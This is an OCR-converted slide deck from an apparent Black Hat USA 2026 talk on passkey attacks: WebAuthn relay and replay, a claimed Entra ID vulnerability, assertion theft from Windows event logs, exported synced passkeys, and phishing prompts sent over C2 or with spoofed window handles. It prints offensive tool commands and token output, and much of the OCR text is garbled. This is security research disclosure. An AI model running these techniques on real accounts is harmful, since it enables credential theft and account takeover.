---
title: "Pass-the-Passkey Family of Attacks"
speakers: ["Michael Grafnetter"]
conference: "Black Hat"
conference_full: "Black Hat USA 2026"
edition: "USA"
year: 2026
source_pdf: "BlackHat_USA_2026_Slides/Michael Grafnetter_Pass-the-Passkey Family of Attacks.pdf"
pages: 71
sha256: "f8f189f759ceb61f28d063dd1f6222b966ae7c779ebccc36fc4bc1a06a5ed9ae"
text_chars: 26689
ocr_pages: 55
has_ocr: true
redacted_secrets: 0
ocr_confidence: 87.5
ocr_unreliable_blocks: 1
ocr_timeouts: 0
pages_recovered_from_text_layer: 2
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T05:39:58Z"
---
# Pass-the-Passkey Family of Attacks

**Speakers:** Michael Grafnetter  
**Conference:** Black Hat USA 2026  
**Source:** `BlackHat_USA_2026_Slides/Michael Grafnetter_Pass-the-Passkey Family of Attacks.pdf` (71 pages)


## Slide 1

**Pass-the-Passkey Family of Attacks Michael Grafnetter Principal Security Researcher**

**dsinternals.com @MGrafnetter**

## Slide 2

## **About Me**

2

## Slide 3

## **Session Agenda**

**03**

Vulnerabilities in Windows 11 and Entra ID

Open-source tools for Windows **05** Attack techniques **20+**

3

## Slide 4

**Pass-the-Passkey Motivation and Previous Research**

4


> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Pass-the-Passkey
Motivation and Previous Research
bisek hat
USA 2026
```

## Slide 5

## **Passkeys Are Becoming Mainstream**

5


> Recovered by OCR — confidence 91/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Passkeys Are Becoming Mainstream
Microsoft | Security Products Solutions Pricing Services Partners Why Microsoft Security
Resources
Contact Sales More
All Microsoft
Search
Light
@ Blog home > Microsoft Entra ID security updates: Passkeys are the default authentication method in Entra ID
News « July 13 « 5 min read
Microsoft Entra ID security
updates: Passkeys are the
default authentication
method in Entra ID
By Nadim Abdo, Corporate Vice President, Identity and Network Access Engineering, Microsoft
Listen to this post
> 0:00 / 0:00 1x
@ Powered by Microsoft Copilot
Search the blog
```

## Slide 6

Passkey Attack Surface
 Public Key Storage
  Relying Party
  HTTPS
  WebAuthn API Web Browser   Extensions
  Password Manager   Operating System
  Syncable Passkeys   Platform Authenticator CTAP2
 USB  NFC ᛒ  BLE
 BUS
  Secure Element — Private Key Storage

## **Passkey Attack Surface**

6

## Slide 7

## **Side-Channel Attacks Against Hardware Keys**

7


> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Side-Channel Attacks Against Hardware Keys
BB tectinica Al BIZGIT CARS CULTURE GAMING HEALTH POLICY SCIENCE SECURITY SPACE TECH FORUM | SUBSCRIBE ¢ OC
= SEND IN THE CLONES
Hackers can clone Google Titan 2FA keys
using a side channel in NXP chips
Yubico and Feitian keys that use the same chip are likely susceptible, too.
1:59PM @ 122
```

## Slide 8

## **Platform Authenticator Vulnerabilities**

8


> Recovered by OCR — confidence 84/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Platform Authenticator Vulnerabilities
Products & Services » Topics » Industry » Content Type » Q
Bypassing Windows Hello Without Masks
or Plastic Surgery
Omer Tsarfati 1/17/23
```

## Slide 9

## **Synced Passkey Exfiltration**

9


> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Synced Passkey Exfiltration
So) Your (Synced) Passkey is Weak
CB) Copying private keys is a bad idea
Brought to you by <x Allthenticate
Synced "passkeys" were created by Apple as means of vendor lock-in,
not as a security feature.
‘& Sign in with Passkey
Passkeys are only as secure as the mechanism that protects them.
Password manager credentials are phishable.
Disable passkeys in your password manager.
Use device-bound keys for real security.
Not all passkeys are created equal.
synced passkeys are stored in cloud-based password managers, which are phishable.
device-bound passkeys never leave the hardware and are effectively unphishable.
```

## Slide 10

## **MITB: Malicious Browser Extension**

10


> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
MITB: Malicious Browser Extension
> zscaler ; Solutions v Partners v Research v Resources v About Us v Try SquareX Enterprise
Passkeys Pwned:
Turning WebAuthn Against Itself
The Passkeys Pwned attack highlights a passkey implementation flaw,
specifically that of WebAuthn in the registration and authentication
process, allowing unauthorized access to enterprise SaaS apps and
resources.
```

## Slide 11

## **MITM – Missing Request Tampering Validation**

11


> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
MITM — Missing Request Tampering Validation
PIN Bypass in Passwordless WebAuthn
on microsoft.com and Nextcloud
aks up on the victim and successfully logs in without entering a PIN using Near Field Communication (NFC).
11
```

## Slide 12

**Pass-the-Passkey WebAuthn Relay Attack Primitive**

12


> Recovered by OCR — confidence 88/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Pass-the-Passkey
WebAuthn Relay Attack Primitive
bisek hat
USA 2026
```

## Slide 13

13
Authentication Flow – Challenge / Response

Source: W3C

## Slide 14

14
Relying Party + User Verification Binding

Source: W3C

## Slide 15

## **W3C WebAuthn Specification – Security First**

15

## Slide 16

## **Passkey Injector UI: Custom WebAuthn Prompts**

16


> Recovered by OCR — confidence 82/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
asskey Injector Ul: Custom WebAuthn Prompts
@ Passkey Authentication (WebAuthn Assertion) = o
© Windows Security x
Request (Parsed) a
Sign in with a passkey
Challenge: TySleUowZVhBaU9pSktWMVFpTENKaGJHY2IPaUpTVXpJMUSpSXNJbmcxZENJNklsaDBMVzgzYUVS
. Mediation: User Verification: Required Hints: Timeout: 600,000
Passkey for login.microsoft.com Aem@cineh
Id Transports Type
a6pp8NT17NCV65JbgUbKws8C20jSjOtiwpuuRXZjEwYy-Mbh_hllLWDqwibkccF public-key
‘
AC
Request (JSON) Y
Scan your finger on the fingerprint reader. ioe °
Request Expiration: @9:23 Challenge JWT Expiration: @4:20
=
4 @
Response (JSON) a
'9K jxcpqEtULDuCJmhs1UN20Td34dEkwpNqPOnAq11-s",
“authenticatorData”: “NWye1KCTIb1pXx6vkYID8bVfaJ2mH7yWGEwVfdpoDIEFAAAAAA™ ,
Choose a different passkey
"type": “public-key”
Cancel }
```

## Slide 17

## **Passkey UI: WIN32 WebAuthn API**

17


> Recovered by OCR — confidence 79/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Passkey Ul: WIN32 WebAuthn API
Load Default Options Help
Windows API Information Registration Authentication Platform Credentials Authenticators Event Log
Assertion Options
Relying party: login.microsoft.com U2F Appl:
Authenticator: Any v Credential hint: None y Remote web origin:
User verification: Required ¥ Large blob operation: None ~» ([_ } Get credential blob Browser in private mode Timeout: 120s e Generate challenge
Challenge:
Large blob:
© Windows Security x
Sign in with a passkey
HMAC secret salt 1: 8A8F1518100B3EB2F6DDOBF5D72ESBA7DFEB71591ED13CD60D903F9AGB99E Generate HMAC secret salt 2: & satya@microsoft.com r) Generate
& Authenticate
Response 1~N
{
‘rawid": "5B4QTDkm-OCOnJk7KAsUa7d3r914aq5H-eVChLSSejM", can your finger on the fingerprint reader.
“responsi
“authenticatorData": "NWye1KCTIblpXx6vkYID8bVfaJ2mH7yWGEwVfdpoDIEFAAAAYA", Sign-in options
“clientExtensionResults": {
“hmacGetSecret”: {
}
}
Choose a different passkey
```

## Slide 18

# **DEMO**

### **Passkey Relay Attack PoC**

18


> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
DEMO
Passkey Relay Attack PoC
bisek hat
USA 2026
18
```

## Slide 19

**CVE-2026-34348 Microsoft Entra ID Vulnerability Chain**

20


> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
CVE-2026-34348
Microsoft Entra ID Vulnerability Chain
bisek hat
USA 2026
```

## Slide 20

## **CVE-2026-34348**

21


> Recovered by OCR — confidence 82/100 on the text kept, 68/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
CVE-2026-34348
@ Event Viewer
File Action View Help
WDAG-PolicyEvaluator-GP
WebAuth
WebAuthN
{| Operational
| Plugin-Passkey-Providers/O
| Synced-Passkey-Provider/O
| WebDeploy
WEPHOSTSVC
WER-Diagnostics
WER-PayloadHealth
WerKernel
WFP
WiFiNetworkManager
Win32k
Windows Defender
Windows Firewall With Advance
Windows Remote Management
WindowsBackup
WindowsColorSystem
WindowsSystemAssessmentToc
WindowsUpdateClient
WinHttp (Microsoft-Windows-\
WinHttp (Microsoft-Windows-\
Winlogon
WinNat
Winsock Catalog Change
Winsock NameResolution Even
Winsock Network Event
Date and Time Source
1/21/2026 12:19:01 AM WebAuthN
1/21/2026 12:19:01 AM — WebAuthN
1/21/2026 12:19:01 AM WebAuthN
1/21/2026 12:19:01 AM WebAuthN
Success 1/21/2026 12:19:01 AM WebAuthN
EventID Task Category
1004 WebAuthN Ctap GetAssertion
2106 Ctap Function
1104
2104
2102
Success
Information
Information Cbor Decode GetAssertion Response
Information Ctap Device Info
Ctap Command
Event 2106, WebAuthN
General Details
‘Ctap Name: authenticationResponseJSON
Value: {"authenticatorAttachment":"platform", "clientExtensionResults":{},"id":"5B4QT Dkm-OCOnJk7KAsUa7d3r914aq5H-
xlbmdlljoiVHk1bGVVb3daVmhCY VUScFNrdFdNVkZwVEVOS2FHSkhZMmxQY VVWVFZY cEpNVT VwU 1hOSmJtY 3haRUSKT mtsc 1FtcFhSR3MwVWpGbk 1FMXFRbFZOVm TjeVI6QktS
IGSOVT WUlhoT mVrbH pT VzFXT kKd(ORFNUWkSWRO15VDBSck 1VMVVVWHBOY m pBdVNEQnhObUwZFZwdFMwcEhkMIZuWidobGRrd3pjR3hpU1UxWVUwMWFT SFpaY khocmRtd
bGhPR295Um04dFNYSkZUeT FtWm01T 1NWZGFaSFVOT m 1acGNYaHdia1paVDIS5R 1JsQiJXamRKUXpOaFoyaGIVSGhtWXpC Wk 1GWklabXhyWkUSbFoweG 1jVEOOUVZkbIVHdzViRUS
Log Name: Microsoft-Windows-WebAuthN/Operational
WebAuthN
2106
Source:
Event ID:
Logged: 1/21/2026 12:19:01 AM
Task Category: Ctap Function
Level: Information Keywords: Ctap
```

## Slide 21

**DEMO Microsoft Entra ID Passkey Replay Attack**

22


> Recovered by OCR — confidence 96/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
DEMO
Microsoft Entra ID Passkey Replay Attack
USA 2026
22
```

## Slide 22

## **Privileged Identity Separation + Single Authenticator**

24


> Recovered by OCR — confidence 83/100 on the text kept, 61/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Privileged Identity Separation + Single Authenticator
@ .
»
© Windows Security
Choose a passkey
00 DiegoS@course.dsinternals.com
Cancel
24
```

## Slide 23

## **Remote Assertion Retrieval – Event Log Readers**

25


> Recovered by OCR — confidence 77/100 on the text kept, 65/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Remote Assertion Retrieval — Event Log Readers
PS > .\Get-PasskeyAssertionEvent.ps1 —ComputerName GRAY
Time
UserSid
UserName
ProcessId
ProcessName
ThreadId
Origin
PublicKkeyCredential :
: 5/11/2026 11:31:16 AM
: GRAY\Michael
: 62212
: PasskeyUI
: 7904
: https://login.microsoft.com
{"id" : "5B4QTDkm—OCOnJk7KAsSUa7d3r914aq5H-eVChLSSejM" , "rawId" : "5B4QTDkm—OCOnJk7KAsUa7d3r914aq5H-eVChLSSejM", "type"
:"public-key", "authenticatorAttachment": "platform", "response": {"clientDataJSON" : "eyJOeXBLIjoid2ViYXVOaG4uZ2VOliw
qT Lhwc2R6QXdSM3A1TOdWNkSXWnJhMDEwUOROS1JHcG1iV10xYVd4ZmIxUKNjMjBSUVVJd1gxWTVOalp4UmxKdU1HeHNXWGNOZVhsQLREbELTVTF
zb2ZOLmNvbSIsImNyb3NzT3JpZ2Lul j pmYWxzZX0" , "authenticatorData" : "NWye1KCTIbLpXx6vkYID8bVfaJ2mH7yWGEwVfdpoDIEFAAAAa
,"userHandLe" : "OXqaPaVaRbsMVE6St710aVDB80VhpNBZ2_w-FNSiemw"}, "cLientExtensionResults": {}}
25)
```

## Slide 24

## **Entra ID Challenge Validity = 10 minutes**

26


> Recovered by OCR — confidence 96/100 on the text kept, 96/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Entra ID Challenge Validity = 10 minutes
https://portal.azure.com
```

## Slide 25

## **JWT ≠ NONCE**

27


> Recovered by OCR — confidence 79/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
JWT # NONCE
iss :
typ":
aud":
lat":
"nbf":
exp":
Ww JWT",
"RS256",
"PcX98GX420T1X6sBDkzhQmqgwMU"
1768947547,
1768947547,
1768947847
27
```

## Slide 26

## **Signature Counter for Device-Bound Passkeys**

28


> Recovered by OCR — confidence 85/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Signature Counter for Device-Bound Passkeys
J Passkey UI
Load Default Options Help
Windows API Information Registration Authentication Platform Credentials Authenticators Event Log
G Load Events
Passkey Operations
Time Started . Type Relying Party Provider Product Counter User Name
2026-05-09 23:49:38 Authentication login.microsoft.com MicrosoftPlatformProvider 103
2026-05-09 19:13:33 Authentication github.com MicrosoftPlatformProvider 117
2026-05-08 02:28:00 Authentication login.microsoft.com MicrosoftPlatformProvider 102
2026-05-06 10:01:17 Authentication login.microsoft.com MicrosoftPlatformProvider 101
2026-05-05 22:03:18 Authentication login.microsoft.com MicrosoftCtapHidProvider YubiKey FIDO 238
2026-05-05 22:02:56 Authentication login.microsoft.com MicrosoftCtapHidProvider YubiKey FIDO 222
```

## Slide 27

## **Partial Fix in May 2026**

29

## Slide 28

## **From Passkeys to OIDC Access Tokens**

30


> Recovered by OCR — confidence 90/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
From Passkeys to OIDC Access Tokens
a SpecterOps Passkey Injector
Y= Bookmarks >
& Request Tokens >
i Developer Tools
W Clear Browsing Data
® Microsoft Teams
® Microsoft Edge
Microsoft Graph Command Line Tools
© Microsoft Azure PowerShell
Microsoft Azure CLI
Microsoft Intune Company Portal
Office 365 Management
B Microsoft Office
OneDrive
30
```

## Slide 29

## **From Passkeys to OIDC Access Tokens**

31


> Recovered by OCR — confidence 84/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
From Passkeys to OIDC Access Tokens
@ Token Response for Microsoft Office — Oo x
Tokens (JSON):
{
“token_type": “Bearer”,
“scope”: “email openid profile AuditLog.Create Calendar.ReadWrite Calendars.Read.Shared Calendars.Readwrite
“expires_in": 4595,
“ext_expires_in": 4595,
“refresh_token": "1.ARwA6WgJJ9X2qkOUDNMw4dUNg9YOWdOzUgJBrv-q@ikqsBZOAMkcAA.BQABAWEAAAADAOz_BQD@_-SggWeqGelt
“foci": "1",
}
(© Copy Access Token © Copy Refresh Token (© Copy ID Token
31
```

## Slide 30

# **DEMO OpenID Connect Token Acquisition**

32


> Recovered by OCR — confidence 91/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
DEMO
OpenID Connect Token Acquisition
USA 2026
32
```

## Slide 31

## **Passkey Circuit Breaker Attack – End User**

34


> Recovered by OCR — confidence 92/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Passkey Circuit Breaker Attack — End User
(ca) * Sign in to GitHub - GitHub x +
Waiting for github.com...
Q github.com/login
Sign in to GitHub
Username or email address
Password Forgot password?
or
a fyi
G Continue with Google
@ Continue with Apple
34
```

## Slide 32

## **Passkey Circuit Breaker Attack – Operator**

35


> Recovered by OCR — confidence 88/100 on the text kept, 72/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Passkey Circuit Breaker Attack — Operator
PS > .\Invoke-PasskeyCircuitBreaker.psl -Suspend -BlockTraffic
Listening for WebAuthN assertion response events... Press Ctrl+C to stop.
Write-Error: C:\Users\Michael\source\repos\SpecterOps\pass-the-passkey\Src\Scripts\Invoke-PasskeyCircuitBreaker.ps1:74
Line |
™mI| .. Block-ProcessOutboundTraffic -ProcessPath $process.Path
| Error blocking outbound traffic for C:\Program Files\Mozilla Firefox\firefox.exe.
Captured WebAuthn assertion request:
EventId : 1103
Time : 5/11/2026 11:36:19 AM
UserSid : S-1-5-21-1084105731-826279734-3585910670-1001
UserName : GRAY\Michael
ProcessId : 1396
ProcessName : firefox
ThreadId : 20008
RpId : github.com
Captured CTAP device info event:
EventId : 2104
Time : 5/11/2026 11:36:26 AM
UserSid : §-1-5-21-1084105731-826279734-3585910670-1001
UserName : GRAY\MichaeL
ProcessId : 1396
ProcessName : firefox
ThreadId : 20008
ProviderName : MicrosoftPlatformProvider
Manufacturer :
AAGuid : Q0000000-0000-0000-0000-000000000000
Captured WebAuthn assertion response:
EventId : 2106
Time : 5/11/2026 11:36:26 AM
UserSid : S-1-5-21-1084105731-826279734-3585910670-1001
UserName : GRAY\Michael
ProcessId : 1396
ProcessName : firefox
ThreadId : 20008
Origin : https://github.com
kGExWOTJk3CV-igJrwoDrupadLREaz5hgV7LLucUDho", "type":
B5
```

## Slide 33

## **GitHub the Grey – Session-Bound Challenges**

36

## Slide 34

**Pass-the-Passkey Synced Passkey Attacks**

37


> Recovered by OCR — confidence 87/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Pass-the-Passkey
Synced Passkey Attacks
bisek hat
USA 2026
```

## Slide 35

## **Synced Passkeys**

38

Source: Yubico


> Recovered by OCR — confidence 96/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Synced Passkeys
Synced Passkey Device-bound Passkey
Lives on a smartphone, tablet, laptop or Lives on a USB key or other piece
other device where it can be copied and of hardware separate from
synced across many devices. everyday devices.
Source: Yubico
```

## Slide 36

## **Server-Side Synced Passkey Protection**

39

Source: Microsoft


> Recovered by OCR — confidence 87/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Server-Side Synced Passkey Protection
Edge Passkey Service
Managed HSM
(Hardware protected keys)
Ld Confidential Ledger
gig (Tamper-Evident Storage)
i Confidential Compute
(Secure Processing & Recovery)
€} Edge Sync Service
(Sync Encrypted Passkeys)
oO 0 Client Devices
—_— (Biometrics/PIN & Device bound Keys)
Source: Microsoft
```

## Slide 37

## **KeePassXC Passkey Export**

40


> Recovered by OCR — confidence 91/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
KeePassXC Passkey Export
Database Entries Groups Tools View Help
Title A Path Username Relying Party URLs
Ww & webauthn.io (Passkey) & Root/KeePassXC-Browser Passkeys john@webauthn.io webauthn.io https//webauthn.io
| webauthn.io
Statistics
@® Export Confirmation x
The passkey file will be vulnerable to theft and unauthorized use, if left
Health Check unsecured. Are you sure you want to continue?
Yes No
Passkeys
NY
Browser Statistics Show expired entries
= Import Export
40
```

## Slide 38

## **Bitwarden Vault Export**

41


> Recovered by OCR — confidence 86/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Bitwarden Vault Export
Password Manager
@ Exporting individual vault
Only the individual vault items associated with michael.grafnetter@outlook.com will be
& My vault
exported. Organization vault items will not be included. Only vault item information will be
oo i
+ oo Allitems exported and will not include associated attachments.
ve Favorites
® Login .json (Encrypted)
alee Export type
&) Identity Account restricted
© Secure note
SSH key vsing ths
B Archive ® Upgradi
U Trash
>» LD Folders
@ Send
&& Generator
§] Import
41
```

## Slide 39

## **Credential Exchange Format (CXF)**

42


> Recovered by OCR — confidence 76/100 on the text kept, 61/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Credential Exchange Format (CXF)
"id": "“akKA3Y@jQRUK7sKp1BOY9w" ,
"credentials": [
"type": “passkey”,
"username": "johndoe”,
"userDisplayName": “John Doe”,
"fido2Extensions": {
"algorithm": "HS256",
"secret": "“c2VjcmV@X2tleV9kYXRh"
42
```

## Slide 40

## **Passing the Synced Passkeys**

43


> Recovered by OCR — confidence 87/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Passing the Synced Passkeys
@ Software Signer = O x
|
, Signature Parameters
Passkey File: 5-the-passkey\Samples\bitwarden_encrypted_export_20260511125855.json Browse...
Passkey: johndoe — dsO1yNiARuafV87QYGB1Vw v
Signature Counter: 5 - User Verification (UV) User Presence (UP)
Credential Details
Algorithm: ECDSA Key Type: P-256 Key Length: 256 Hash: SHA256
Credential ID: dsO1yNiARuafV87QYGB1Vw
User Name: johndoe
User Handle: cnEzaNHWcYK3coWZjvoaV1Hj9gnl12mKe2dL2HZVFIY
43
```

## Slide 41

**DEMO Passing the Synced Passkeys**

44


> Recovered by OCR — confidence 95/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
DEMO
Passing the Synced Passkeys
USA 2026
44
```

## Slide 42

# **Passkey Phishing Attack Breaking the Phishing Resistance**

46


> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Passkey Phishing Attack
Breaking the Phishing Resistance
bisek hat
USA 2026
```

## Slide 43

## **Phishing Protection - Related Origin Requests (ROR)**

47


> Recovered by OCR — confidence 86/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Phishing Protection - Related Origin Requests (ROR)
michaeL@GRAY:-$ curl https://login.microsoft.com/.well-known/webauthn
{
"origins': [
"https://login. live.com",
}michael@GRAY:~$ ff
47
```

## Slide 44

## **Passkey Phishing Attack – Prompt**

48


> Recovered by OCR — confidence 86/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Passkey Phishing Attack — Prompt
PS > .\SharpPasskeys.exe prompt -r github.com ~-c 1IOBmIehGH8dZKXjxdSw_VHs5wxrI8HnoaxDAZS5 -a ClientDevice
19:13:33 info: Passkeys[0] Prompting for credentials with relying party 'github.com' and authenticator hint 'ClientDevice'..
© Windows Security x
Sign in with a passkey
Gq MichaelGrafnetter ©
nei} Passkey for github.com
wr
Hello, Michael!
Select OK to continue.
Sign-in options
Choose a different passkey
```

## Slide 45

## **Passkey Phishing Attack – Assertion Response**

49


> Recovered by OCR — confidence 86/100 on the text kept, 68/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Passkey Phishing Attack — Assertion Response
PS > .\SharpPasskeys.exe prompt -r github.com -c 1I0BmIehGH8dZKXjxdSw_VHs5wxrI8HnoaxDAZS5 -a ClientDevice
19:13:33 info: Passkeys[0] Prompting for credentials with relying party 'github.com' and authenticator hint 'ClientDevice'...
Nyb3NzT3JpZ2Lul j pmYWxzZX0"}}
49
```

## Slide 46

## **C2 Command Generation**

50


> Recovered by OCR — confidence 84/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
C2 Command Generation
Authenticator Type Hint: Windows Hello (Platform) v C) Prompt Flood C-) Kill Credential Ul Broker C1) Spoof Window Handle
SharpPasskeys (Standalone CLI) A
SharpPasskeys.exe prompt --relying-party login.microsoft.com --authenticator ClientDevice --challenge Ty5leUowZVhBaU9pSktWMVFp"
SharpPasskeys (Mythic Apollo Agent) a
register_assembly -existingFile SharpPasskeys.exe
execute_assembly -Assembly SharpPasskeys.exe -Arguments "prompt --relying-party login.microsoft.com --authenticator ClientDevice -
PowerShell a
Import-Module -Name DSInternals.Passkeys
Test-Passkey -RelyingPartyld login.microsoft.com -Hint ClientDevice -Challenge TySleUowZVhBaU9pSktWMVFpTENKaGJHY2IPaUpTVXpJ
X Close
50
```

## Slide 47

# **DEMO**

**Passkey Phishing Attack over C2 (Mythic + Apollo)**

51

## Slide 48

52


> Recovered by OCR — confidence 81/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
INTERACT WIP ll HOST lL USER | DOMAIN i PID I LAST CHECKIN ll DESCRIPTION o
EbOw ¢ 10.101.0.123 CANARY Admin CANARY 13196 1 seconds Created by mythic_admin at 2026-04-02 13:21:36 ;|
ES ¢.172.26.128.1 CONTOSO-PC1 Admin contoso 11376 4 seconds Created by mythic_admin at 2026-04-02 13:21:36 Ry
C2 => WIN11 X |
| ys.exe -Arguments prompt --relying-pa... [Fri May 15 2026 02:52 PM] / T-106 / mythic_admin / C-9 /
[Fri May 15 2026 02:38 PM] / T-99 / mythic_admi... | § help
inline_assembly -Assembly ad ¥ 4. Command Description f=
ys.exe -Arguments prompt --relying-pa... 20 ==s===== X
[Gt ESL GA Aes Oita gta tl 4 Description: The 'clear' command will mark tasks as 'cleared' so that they can't +
help be picked up by agents Q
[Fri May 15 2026 02:47 PM] / 1-101 / mythic_adm.. 5 assembly_inject Usage: assembly_inject [pid] [assembly] [args]
PTR eet ie eb Che ae 6 Description: Inject the unmanaged assembly loader into a remote process. The rt
— y y P loader will then execute the .NET binary in the context of the injected ~
keys.exe -Arguments prompt --relying-... process. ra]
[Fri May 15 2026 02:47 PM] / T-102 / mythic_adm 7 download Usage: download -Path [path/to/file]
hel 7 B 8 Description: Download a file off the target system. S
le { 9 execute_assembly Usage: execute_assembly [Assembly.exe] [args]
[Fri May 15 2026 02:49 PM] /-103/ mythic_adm.) 10 Description: Executes a .NET assembly with the specified arguments. This assembly [7
execute_assembly -Assembly SharpPass must first be known by the agent using the ‘register_assembly* command or by
k a palace supplying an assembly with the task. hy
[Fri May 15 2026 02:49 PM] / 1-104 / mythic_adm..| 12 Description: Executes an unmanaged executable with the specified arguments. This A
hot executable must first be known by the agent using the ‘register_file’ command.
[Fri May 15 2026 02:50 PM] /T-105/ mythic_adm..| 14 Description: Task the implant to exit.
execute_assembly -Assembly SharpPass 15 help Usage: help [command ] \ . . . . _ A
“ouncre Qigstrn eset ooh 16 Description: The 'help' command gives detailed information about specific commands
YE: 9g SE or general information about all available commands. ()
[Fri May 15 2026 02:52 PM] / T-106 / mythic_adm 17 get_injection_techniques Usage: get_injection_techniques
help 18 Description: List the currently available injection techniques the agent knows
& Dir: C:\Users\Admin\Downloads |
2a | Task an agent... > i
```

## Slide 49

## **Passkey Prompt Flooding Attack**

53

## Slide 50

## **Passkey Phishing over RDP**

54


> Recovered by OCR — confidence 89/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Passkey Phishing over RDP
Remote Desktop
Connection
Local devices and resources
Choose the devices and resources on this computer that you want to
use in your remote session.
@smart cards or Windows Hello for Business
@WwebAuthn (Windows Hello or security keys)
+{_ |Video capture devices
+(_ Other supported Plug and Play (PnP) devices
54
```

## Slide 51

## **Passkey Phishing from Hyper-V VM**

55


> Recovered by OCR — confidence 87/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Passkey Phishing from Hyper-V VM
File Action Media View Help
BE Windows PowerShell xX + y = fa) x
PS > .\SharpPasskeys.exe prompt github.com QmFQcLh3QUFBQURTQ “
kZoZzczeExFUVo2cOdNVndx »
12:20:19 info: Passkeys[0] Prompting for credentials with relying party 'github.com' and
authenticator hint 'None'...
Sign in with a passkey
&
© passkey for github.com
Scan your finger on the fingerprint reader.
Sign-in options
Choose a different passkey
Cancel
Windows Security x
```

## Slide 52

# **Passkey Phishing Attack Application Identifier Spoofing**

56


> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Passkey Phishing Attack
Application Identifier Spoofing
bisek hat
USA 2026
```

## Slide 53

## **Application Identifier**

57


> Recovered by OCR — confidence 91/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Application Identifier
© Windows Security
Sign in with a passkey
a Passkey for login.microsoft.com
Requested by PasskeyUI (Michael Grafnetter)
=
Scan your finger on the fingerprint reader.
Sign-in options
Choose a different passkey
Cancel
57
```

## Slide 54

## **Application Identifier Spoofing – HWND Injection**

58


> Recovered by OCR — confidence 85/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Application Identifier Spoofing - HWND Injection
PS > Get-Process msedge | Where-Object MainWindowHandle ® | Format-Table MainWindowHandle, Name
MainWindowHandle Name
12262062 msedge
PS > .\Passkeys.exe prompt github.com 12262062 DVcoAwqLUHHcVOmaTPQJegMIGYuWdxhF j u6yq2KOLGU
11:09:41 info: Passkeys[0] Using provided window handle 12262062.
11:09:41 info: Passkeys[0] Prompting for credentials with relying party 'github.com' and authenticator hint 'None'...
\ HE Microsoft - Al, Cloud, Productivity X +
Microsoft — Mic 5 Azure Copilot Windows Surface More
© Windows Security
Sign in with a passkey
Gq MichaelGrafnetter
rad Passkey for github.com
Requested by Microsoft Edge (Microsoft Corporation)
Scan your finger on the fingerprint reader.
advanced security, a
F Sign-in options
your favorite apps
Choose a different passkey
Cancel
58
```

## Slide 55

## **Application Identifier Spoofing – Version Info Struct**

59


> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Application Identifier Spoofing — Version Info Struct
-P PasskeyUl.exe Properties
General Compatibility Digital Signatures
Security Details Previous Versions
Property Value
Description
File description PasskeyUl
Type Application
File version 3.0.0.0
Product version 1.0.0+#d7054dbce4d21f32d35877b04f63cd...
